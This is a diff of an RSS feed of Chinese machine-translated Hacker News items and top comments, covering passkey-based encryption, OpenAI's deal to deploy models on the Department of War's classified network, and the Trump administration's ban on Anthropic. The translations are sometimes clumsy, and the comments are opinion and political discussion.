@@ -6,147 +6,54 @@
     <link>https://tang1keke.github.io/hn-summary-and-translate</link>
     <description>Hacker News articles summarized and translated to Chinese (Simplified)</description>
     <language>zh-CN</language>
-    <lastBuildDate>Sat, 28 Feb 2026 04:23:41 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 28 Feb 2026 06:45:16 +0000</lastBuildDate>
     <generator>HN RSS Translator</generator>
     <atom:link rel="self" type="application/rss+xml" href="https://tang1keke.github.io/hn-summary-and-translate/rss-zh.xml"/>
     <item>
-      <title>不要使用密钥来加密用户数据</title>
-      <link>https://blog.timcappalli.me/p/passkeys-prf-warning/</link>
-      <description>&lt;p&gt;系统不会提示他们使用密钥，因为其凭证管理器中不再存在密钥。相反，他们使用电话号码验证来恢复他们的帐户。由于他们不再拥有它，因此他们被告知无法访问备份的数据。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; Don't use passkeys for encrypting user data&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47189749"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href='https://blog.timcappalli.me/p/passkeys-prf-warning/'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Top 8 Comments:&lt;/strong&gt;&lt;/p&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;johncolanduoni:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;有多少人正在对密码管理器中未使用的密钥进行春季清理？我们谈论的是一千字节的数据，在任何正常情况下都没有人需要删除这些东西。&lt;p&gt;当然，如果用户能够存储 5 个加密密钥副本，其中一个放在海底的密码箱中，那就太好了。但这在任何规模上都不会发生，因此将加密密钥自动放入复制密码管理器中的方法是有意义的。与人们通常处理端到端加密密钥的方式相比，它在实践中会导致数据丢失少得多。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;peterspath:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我正在研究这个以开始使用它。因为不让用户担心涉及数据加密的所有细节是非常用户友好的。&lt;p&gt;我想通知他们是一个很好的开始方式。还有其他关于如何改进这一点的建议吗？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;hedora:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;100% 反对对 e2ee 数据使用密钥的论点都适用于使用密钥作为凭据。&lt;p&gt;（除非它们不是凭据，您可以丢失它们，然后通过电子邮件和短信等容易出现网络钓鱼的渠道进行密码重置。支持此功能可以消除密钥给用户带来的任何可能的好处。）&lt;p&gt;除了本文中的论点之外，当用作凭据时，它们是一种明显的特洛伊木马，允许大型网站完全劫持您的操作系统。&lt;p&gt;不要相信我吗？  尝试登录银行或使用乘车共享&amp;#x2F;停车&amp;#x2F;ev 与 degoogled android 充电。  这就是万能钥匙占领电脑的地方，也是它们唯一的目的。&lt;p&gt;因此，“不要使用万能钥匙”将是一个更好的标题。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;wmf:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;另一种说法是，您必须有一个帐户恢复过程，并且您需要考虑加密与帐户恢复如何交互。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;dansjots:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我最近制作了一个简单的 PWA，将 Typage[0] 包装成一个快速而肮脏的工具，以使用密钥单独加密文件：&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=46895533"&gt;https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=46895533&lt;/a&gt;&lt;p&gt;这为用户提供了更有意识的控制，知道他们正在使用哪个密钥显式加密哪个文件。此外，您只需下载该页面并通过本地主机提供服务，以便始终控制密钥的来源。&lt;p&gt;[0] &lt;a href="https:&amp;#x2F;&amp;#x2F;words.filippo.io&amp;#x2F;passkey-encryption&amp;#x2F;" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;words.filippo.io&amp;#x2F;passkey-加密&amp;#x2F;&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;dchest:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这篇文章中没有任何内容专门针对密钥；它读起来就像建议不要加密数据。无论如何，没有办法防止某些用户丢失加密密钥。无论您包含什么警告，即使软件没有连接到互联网而只是加密本地文件，有人也会写信来支持他们忘记了密码，并要求您“重置”密码。它。&lt;p&gt;不过，最后的建议是好的。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;SoftTalker:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这就是为什么我还没有开始使用密钥。管理它们看起来很复杂，而且我不明白我正在做的事情的后果。&lt;p&gt;也是一个风格问题，使用“他”是可以的。或“她”人为叙述中的代词。 “他们”是他们的”用法确实降低了示例的清晰度。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;halapro:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;如果用户删除密码，他们会看到同样的消息。密码的唯一优点是您可以记住它们，但您是否也建议不要使用生成的密码？&lt;/p&gt;&lt;/div&gt;</description>
-      <guid isPermaLink="true">https://blog.timcappalli.me/p/passkeys-prf-warning/</guid>
-      <pubDate>Sat, 28 Feb 2026 03:11:40 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47189749</comments>
+      <title>如何取消我的 ChatGPT 订阅？</title>
+      <link>https://help.openai.com/en/articles/7232927-how-do-i-cancel-my-chatgpt-subscription</link>
+      <guid isPermaLink="true">https://help.openai.com/en/articles/7232927-how-do-i-cancel-my-chatgpt-subscription</guid>
+      <pubDate>Sat, 28 Feb 2026 05:55:01 +0000</pubDate>
+      <comments>https://news.ycombinator.com/item?id=47190997</comments>
     </item>
     <item>
-      <title>OpenAI 与战争部达成一致，在其机密网络中部署模型</title>
-      <link>https://twitter.com/sama/status/2027578652477821175</link>
-      <description>&lt;p&gt;我们检测到该浏览器中禁用了 JavaScript。请启用 JavaScript 或切换到支持的浏览器以继续使用 x。服务条款 隐私政策 Cookie 政策 版本说明 广告信息 © 2026 X Corp.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; OpenAI agrees with Dept. of War to deploy models in their classified network&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47189650"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href='https://twitter.com/sama/status/2027578652477821175'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Top 27 Comments:&lt;/strong&gt;&lt;/p&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;slopinthebag:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;感觉 Hackernews 正在被 Anthropics 营销团队包围。很多人（机器人？）都在谈论取消他们的 OAI 子项目 &amp;#x2F;切换到克劳德。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;AbstractH24:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;令人惊讶的是，参与者的转变速度如此之快。&lt;p&gt;昨天和前天，情绪似乎集中在“Anthropic 出卖”上，然后转向“Anthropic 在大卫与歌利亚中坚持其原则”和“整个行业将团结起来”。但突然间，我们看到了一个新的叙述：“邪恶的 OpenAI 突然介入，与魔鬼做交易。”&lt;p&gt;让人想起山姆·奥尔特曼 (Sam Altman) 失去对 OpenAI 控制的那个周末。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;d--b:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;现阶段，OpenAi 所做的一切都是为了让投资者继续投资。&lt;p&gt;他们愿意为了这份政府合同而让自己的品牌变成垃圾。&lt;p&gt;几乎每个美国人都在这件事上与 Anthropic 站在一起。左派或右派都没有人想要大规模监视和终结者。事实上，除了美国军方之外，世界上没有人想要这样的结果。&lt;p&gt;但奥特曼似乎非常渴望保持现金来源，他已经准备好做任何事情。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;AmericanOP:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;战争部刚刚取消了 OpenAI 的品牌&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;drivebyhooting:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;根据我的经验，ChatGPT 是领先模型中最道貌岸然的一个。&lt;p&gt;当我需要有关秘密行动的建议时，我总是向 Grok 求助。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;lefrenchy:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;有一天，这会对萨姆产生适得其反的效果，他只是特朗普政府议程中的一颗棋子。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;iainctduncan:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;有人怀疑过大人会只追随金钱吗？&lt;p&gt;黄鼠狼会黄鼠狼&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;mkozlows:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;所以这里有两种可能性：&lt;p&gt;1。没有实质性的改变。赫格斯·特朗普只是想惩罚人类对抗他们的行为，即使今天没有给他们带来任何其他好处——毕竟，在这种情况下，为未来建立寒蝉效应对他们来说有一定的价值。 OpenAI 愿意帮助他们做到这一点，尽管早些时候声称他们支持 Anthropic 的决定。&lt;p&gt;2.有实质性的改变。尽管 Altman 这么说，但他们心照不宣，认为 OpenAI 不会真正执行这些条款，或者他们会允许在未来某个时候，当注意力转移到其他地方时，对这些条款进行修改。&lt;p&gt;无论哪种方式，这都让 Altman 看起来很粘人，而 OpenAI 在 Anthropic 做出了正确的原则立场的情况下，与特朗普结盟反对 Anthropic。一段时间以来，很明显 Anthropic 比 OpenAI 更有道德，但这比之前的任何例子都更加赤裸裸。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;AmericanOP:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;即时卸载。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;dakolli:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;他们假装去年一月没有签署这项协议，并且已经完全融入情报计划中。他们试图让自己看起来像是在需要的时候（国防部需要的时候）挺身而出，实际上他们一年前就把自己的灵魂卖给了情报部门和军方。&lt;p&gt;在 Sam 发推文后，我在这里发布了这一消息：&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47189756"&gt;https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47189756&lt;/a&gt;&lt;p&gt;来源：&lt;a href="https:&amp;#x2F;&amp;#x2F;defensescoop.com&amp;#x2F;2025&amp;#x2F;01&amp;#x2F;16&amp;#x2F;openais-gpt-4o-gets-green-light-for-top-secret-use-in-microsofts-azure-cloud&amp;#x2F;" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;defensescoop.com&amp;#x2F;2025&amp;#x2F;01&amp;#x2F;16&amp;#x2F;openais-gpt-4o-gets-gree...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;straydusk:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我知道，如果你是一个理性的观察者，对此的反应是“OpenAI 已经走捷径或做出了 Anthropic 没有的让步，这是唯一有意义的事情。”&lt;p&gt;但是，如果你住在美国并且偶尔关注我们愚蠢的政治，你就会知道这完全是特朗普的剧本。它是这样的：&lt;p&gt;* 使谈判个性化&lt;p&gt;* 情绪上猛烈抨击并终止谈判&lt;p&gt;* 与更糟糕或类似的一方完成更糟糕或类似的交易&lt;p&gt;* 将更糟糕的交易庆祝为更好的交易&lt;p&gt;重要的是，你必须浪费大量时间和资源来获得任何实质性内容。&lt;p&gt;这就是为什么我实际上相信 OpenAI 将达到与 Anthropic 相同的标准，至少目前如此。他们会像 Anthropic 那样继续这样做吗？似乎不太可能，但我们拭目以待。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;dataflow:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这看起来漏洞百出。&lt;p&gt;&gt; DoW 同意这些原则，将其反映在法律和政策中，然后我们将其纳入我们的协议中。&lt;p&gt;(1) 那么，双方&lt;i&gt;签署了&lt;/i&gt;该协议吗？它实际上有效吗？或者它是否仍然坐在某人的办公桌上，直到它停滞足够长的时间？&lt;p&gt;(2) 什么“协议”？甚至意味着？这是一份&lt;i&gt;具有法律效力的合同&lt;/i&gt;，还是只是某种谅解备忘录或小指承诺？&lt;p&gt;(3) 如果它是一份具有法律效力的合同，它是否对他们的&lt;i&gt;所有&lt;/i&gt;合同都具有同等的可执行性，还是只是部分合同？他们没有需要适用的现有合同吗？&lt;p&gt;(4)“在法律和政策中反映他们”是什么意思？甚至意味着？ DoW 从什么时候开始制定法律？他们的法律在什么意义上反映了协议的内容？他可以指出这些法律以便其他人都能看到吗？他至少可以复制粘贴政府同意的确切句子吗？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;Robdel12:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;如果你真的读了或者你读了标题并回复了请举手？我看到很多评论，看起来他们好像没有读过。&lt;p&gt;&amp;gt;我们最重要的两项安全原则是禁止国内大规模监视和人类对使用武力（包括自主武器系统）的责任。  美国国防部同意这些原则，将它们反映在法律和政策中，我们将它们纳入我们的协议中。&lt;p&gt;如果这是真的，它应该是可验证的。那么，我们等待？我的意思是，我是个傻瓜，但那种语言对我来说似乎也不太肮脏？要么这是一个大胆的谎言，OpenAI 因此而被烧毁，要么这是真的，特朗普政府正在追捕“左派”人工智能公司。或者无论如何。我的观点是，比我更聪明的人将会对 Sam 的说法进行事实核查。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;corford:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;如果您对此不满意，可以通过您的钱包来立即表明这一点。就我而言，我刚刚从手机上卸载了 chatgpt，取消了我的订阅，并将增加我在 anthropic 上的支出。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;davidw:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我们需要某种“有道德的科技人”这样的群体。我受够了这些人以及他们的腐败和垃圾。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;elAhmo:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这么多钱，却没有一丁点诚信。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;mythz:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;Sam 是人工智能领域最不值得信任的人，我不相信他的话的表面价值，我认为这些都是狡猾的话：&lt;p&gt;&gt;禁止国内大规模监视和*使用武力*的人类责任&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;Jcampuzano2:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;我敢打赌这个问题可能是有人指出 Anthropic 的模型被用来协助委内瑞拉的突袭，然后 Anthropic 积极地加倍遵守他们的规则和原则，而 DOD 不喜欢被指责，所以他们猛烈抨击。&lt;p&gt;如果这个管理员有什么不喜欢的，那就是被任何人反对或指责，尤其是在公共场合。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;interestpiqued:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;什么蛇啊&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;cube00:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;如果红线相同，这笔交易是如何达成的？&lt;p&gt;&lt;i&gt;OpenAI 发言人向 CNN 证实，在与五角大楼合作时，ChatGPT 制造商 OpenAI 与 Anthropic 有着相同的红线。&lt;/i&gt;&lt;p&gt;&lt;a href="https:&amp;#x2F;&amp;#x2F;edition.cnn.com&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;tech&amp;#x2F;openai-has-same-redlines-as-anthropic-in-any-deal-with-the-pentagon" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;edition.cnn.com&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;27&amp;#x2F;tech&amp;#x2F;openai-has-same-redl...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;operator_nil:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;那么这是否意味着 OpenAI 将满足国防部的要求，并且他们会发誓它不会用于大规模监视和自动杀戮机器？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;Imnimo:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;鉴于此，我不知道签署了“我们不会分裂”信函的 OpenAI 员工如何继续在那里工作。当然，如果 OpenAI 坚持与 Anthropic 一样的做法，政府就不会签署这份协议。唯一合理的解释是，人们普遍认为 OpenAI 在实践中不会执行红线。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;robertwt7:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;他们是如何同意最初由 Anthropic 提出但与 OpenAI 提出的条款的？这里肯定有一个陷阱。或者只是山姆的谈判技巧？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;rich_sasha:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;五角大楼是否签署了一份最终用户许可协议，确认他们的所有数据现在都将被匿名使用，以改善服务？&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;deaux:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;在董事会叛乱期间保证 sama 回归的所有 OpenAI 员工均负有个人责任。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;push0ret:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;所以他们同意了先前导致与人择公司产生分歧的相同红线？有点奇怪。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;jordanscales:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这很尴尬吗？ &lt;a href="https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47188473"&gt;https:&amp;#x2F;&amp;#x2F;news.ycombinator.com&amp;#x2F;item?id=47188473&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</description>
-      <guid isPermaLink="true">https://twitter.com/sama/status/2027578652477821175</guid>
-      <pubDate>Sat, 28 Feb 2026 02:59:02 +0000</pubDate>
-      <comments>https://news.ycombinator.com/item?id=47189650</comments>
-    </item>
-    <item>
-      <title>特朗普总统禁止 Anthropic 在政府系统中使用</title>
-      <link>https://www.npr.org/2026/02/27/nx-s1-5729118/trump-anthropic-pentagon-openai-ai-weapons-ban</link>
-      <description>&lt;p&gt;Anthropic 表示将在法庭上对供应链风险指定提出质疑。Anthropic 还对 Hegseth 的言论提出质疑，即任何与美国军方有业务往来的人都必须切断与 Anthropic 的所有业务。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Original:&lt;/strong&gt; President Trump bans Anthropic from use in government systems&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://news.ycombinator.com/item?id=47186031"&gt;&lt;strong&gt;HN Discussion&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href='https://www.npr.org/2026/02/27/nx-s1-5729118/trump-anthropic-pentagon-openai-ai-weapons-ban'&gt;Read Original Article&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Top 29 Comments:&lt;/strong&gt;&lt;/p&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;ViscountPenguin:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;干得好，我一直认为人类是处理生存风险最好的人工智能公司，这强化了这种观点。如果你不想要终结者，不帮助人们发明终结者是一个很好的第一步。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;stopbulying:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;&gt; 【不会是我的小防守b吧？那你根本就不能做政府合同！ ]&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;_alternator_:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;这应该不足为奇。政府不会容忍任何具有挑战其权力的“价值观”或“顾忌”的人。最近的一个例子是，他们解雇了拒绝授权袭击民用船只的军法署署长（军事律师）。如果你出于任何原因说“不”，他们就会解雇你。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;thomassmith65:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;请 Anthropic 就这场纠纷制作 30 秒的广告！&lt;p&gt;不是强行推销，而只是&lt;i&gt;“这是政府向我们提出的两项要求，这就是我们不同意的原因”&lt;/i&gt;&lt;p&gt;这使得该公司对大多数公众如此有吸引力 - 不仅是那些不喜欢特朗普的人，还有那些不信任政府的人。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;drivingmenuts:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;就我而言，这是对 Anthropic 的黄金推荐。&lt;/p&gt;&lt;/div&gt;
-&lt;div style="margin: 10px 0; padding: 10px; background: #f6f6f6; border-left: 3px solid #ff6600;"&gt;&lt;p style="margin: 0 0 5px 0;"&gt;&lt;strong&gt;Animats:&lt;/strong&gt;&lt;/p&gt;&lt;p style="margin: 0;"&gt;围绕特朗普的咆哮，发生了一些有趣的事情。一些白宫工作人员指示较低级别的工作人员忽视他们并专注于经济。  詹姆斯·布莱尔 [2] 似乎在这方面处于领先地位。布莱尔负责特朗普竞选的政治策略，他赢了，所以他可能不会被解雇。&lt;p&gt;有一些总统在衰落时被幕僚半抓捕。拜登、里根和罗斯福都是。特朗普可能会时不时地出去发表他的标准演讲（无论主题或地点如何，他的演讲内容都大致相同），但白宫的工作涉及他较少。&lt;p&gt;观察哪些威胁会采取行动，哪些不会。&lt;p&gt;[1] &lt;a href="https:&amp;#x2F;&amp;#x2F;www.theatlantic.com&amp;#x2F;政治&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;特朗普-共和党-中期选举&amp;#x2F;686116&amp;#x2F;" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;www.theatlantic.com&amp;#x2F;政治&amp;#x2F;2026&amp;#x2F;02&amp;#x2F;trump-gop-repub...&lt;/a&gt;&lt;p&gt;[2] &lt;a href="https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;James_Blair_(political_advisor)" rel="nofollow"&gt;https:&amp;#x2F;&amp;#x2F;en.wikipedia.org&amp;#x2F;wiki&amp;#x2F;James_Blair_(political_advisor...&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
